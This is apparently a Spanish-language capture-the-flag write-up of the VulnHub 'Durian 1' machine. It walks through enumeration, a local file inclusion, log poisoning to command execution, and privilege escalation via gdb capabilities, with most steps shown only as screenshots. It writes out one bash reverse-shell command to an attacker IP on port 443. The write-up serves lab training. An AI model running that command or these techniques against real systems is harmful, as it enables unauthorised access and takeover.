#ctf-machine #vulnhub #easy-machine #linux [Vulnhub Link](https://www.vulnhub.com/entry/durian-1,553/)

## Enumeración inicial
Como no conocemos la dirección IP de la máquina víctima, hacemos un escaneo ARP con `arp-scan`:
![[Pasted image 20240904155436.png]]

Como vemos la IP es la "192.168.159.152", ya que si nos fijamos, el OUI de la dirección MAC es "00:0c" correspondiente a las máquinas que se importan en VMWare.

Lanzamos una traza ICMP con `ping` y como el TTL es 64 podemos decir que probablemente se trate de una máquina Linux, ya que suelen tener este valor de TTL:
![[Pasted image 20240904155638.png]]

### Nmap
Hacemos un primer escaneo con `nmap` para identificar los puertos TCP abiertos de la máquina víctima:
![[Pasted image 20240904160248.png]]

Como vemos, hay cuatro puertos abiertos, el puerto 22, 80, 7080 y 8088.

Hacemos un segundo escaneo con `nmap` para detectar la versión y servicio que corren para cada uno de estos puertos abiertos:
![[Pasted image 20240904160652.png]]
![[Pasted image 20240904160719.png]]
![[Pasted image 20240904160751.png]]

## Enumeración web
Si accedemos a la web que corre por el puerto 80 vemos lo siguiente:
![[Pasted image 20240904161152.png]]


Como vemos no hay nada interesante, así que hacemos *fuzzing* con `gobuster` para encontrar directorios y como vemos, encontramos un directorio `/blog` y `/cgi-data`:
![[Pasted image 20240904161901.png]]

## LFI
Si accedemos a `/cgi-data/`, vemos lo siguiente:
![[Pasted image 20240904163632.png]]

Como vemos tenemos capacidad de *directory listing* además de que hay un archivo llamado "getImage.php", que si accedemos a él vemos:
![[Pasted image 20240904163730.png]]

Parece ser que se está utilizando el parámetro "file" para incluir archivos por lo que podemos acontecer un LFI:
![[Pasted image 20240904163824.png]]

Si intentamos apuntar a algún *log*, vemos que no podemos hacerlo. Por lo que podemos apuntar a `/proc/self/fd/` y hacemos *fuzzing* para encontrar contenido interesante con `burpsuite` y su funcionalidad *intruder*, vemos lo siguiente:
![[Pasted image 20240904171054.png]]

Si nos fijamos en el *fd* número 8, vemos los *logs* de la web, por lo que podemos acontecer un *Log* *poisoning*.
![[Pasted image 20240904171206.png]]

Así que hacemos una solicitud con curl a la web con un User-Agent malicioso con este código PHP:
![[Pasted image 20240904172545.png]]

Una vez realizada la solicitud, accedemos al recurso y añadimos el comando "cmd" en la URL para ejecutar comandos:
![[Pasted image 20240904172715.png]]

Por lo que si utilizamos el parámetro "cmd" para ejecutar este comando:
```bash
bash -c "bash -i >& /dev/tcp/192.168.159.131/443 0>&1"
```

Y nos ponemos en escucha con `nc` por el puerto 443, obtenemos una *reverse shell*:
![[Pasted image 20240904172916.png]]

Por lo que hacemos el tratamiento de la TTY: 
![[Pasted image 20240904173025.png]]
![[Pasted image 20240904173118.png]]

## Escalada de privilegios
Si mostramos las *capabilities* de los binarios del sistema, vemos que el binario `gdb` tiene la siguiente *capability*:
![[Pasted image 20240904173859.png]]

De la cual forma si ejecutamos el siguiente comando, podemos obtener una "bash" como *root*:
![[Pasted image 20240904174018.png]]

Y visualizar la *flag* del directorio `/root`:
![[Pasted image 20240904174050.png]]

___
#local-file-inclusion #abusing-capabilities #web-enumeration #log-poisoning 
___